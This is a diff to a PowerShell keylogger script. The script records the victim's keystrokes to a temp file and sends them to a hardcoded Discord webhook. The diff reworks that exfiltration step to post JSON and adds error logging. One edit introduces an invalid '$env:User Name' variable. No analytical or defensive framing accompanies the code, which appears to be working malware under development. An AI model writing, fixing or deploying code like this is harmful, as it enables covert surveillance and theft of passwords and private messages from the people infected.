@@ -8,7 +8,7 @@ $webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40m
 $PID > "$env:temp/DdBPKCytRe"
 
 # keylogger
-function KeyLogger($logFile="$env:temp/$env:UserName.log") {
+function KeyLogger($logFile="$env:temp/$env:User Name.log") {
   
   # generate log file if it doesn't exist
   if (-not (Test-Path $logFile)) {
@@ -47,16 +47,28 @@ function KeyLogger($logFile="$env:temp/$env:UserName.log") {
   }
   catch {
     # Log the error for debugging
-    Write-Host "Error: $_"
+    Add-Content -Path "$env:TEMP\error_log.txt" -Value "Error in KeyLogger: $_"
   }
   finally {
     # send logs via webhook
     $logs = Get-Content "$logFile" | Out-String
     $Body = @{
-      'username' = $env:UserName
+      'username' = $env:User Name
       'content' = $logs
     }
-    Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body
+    
+    # Convert the hashtable to a JSON string
+    $JsonBody = $Body | ConvertTo-Json
+
+    # Try to send the message
+    try {
+        $response = Invoke-RestMethod -Uri $webhook -Method 'POST' -Body $JsonBody -ContentType 'application/json'
+        Write-Host "Logs sent successfully: $response"
+    } catch {
+        # Log the error
+        Add-Content -Path "$env:TEMP\error_log.txt" -Value "Error sending logs: $_"
+        Write-Host "Failed to send logs: $_"
+    }
   }
 }
 
